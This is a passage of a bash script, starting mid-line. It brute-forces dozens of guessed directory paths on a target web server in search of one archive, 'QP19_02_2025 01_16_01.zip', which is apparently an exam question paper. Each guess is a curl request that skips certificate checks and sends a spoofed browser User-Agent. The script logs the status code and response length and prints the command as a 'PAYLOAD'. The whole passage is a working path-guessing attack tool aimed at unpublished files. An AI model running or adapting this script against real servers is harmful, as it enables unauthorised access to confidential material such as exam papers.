" "${target}ExamPaper-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtAccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtAccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
